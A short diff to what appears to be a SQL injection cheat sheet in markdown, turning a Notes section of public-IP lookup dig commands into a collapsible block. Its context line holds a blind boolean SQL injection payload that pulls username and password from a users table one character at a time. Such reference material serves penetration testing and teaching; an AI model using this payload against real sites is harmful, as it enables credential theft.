@@ -228,7 +228,7 @@ We get TRUE, then let try an higher one.
 ~~~bash
 http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105
 ~~~
-
-> Notes
-*dig +short myip.opendns.com @resolver1.opendns.com*
-*dig TXT +short o-o.myaddr.l.google.com @ns1.google.com*
+<details>
+<summary>Notes</summary>
+> *dig +short myip.opendns.com @resolver1.opendns.com*
+> *dig TXT +short o-o.myaddr.l.google.com @ns1.google.com*
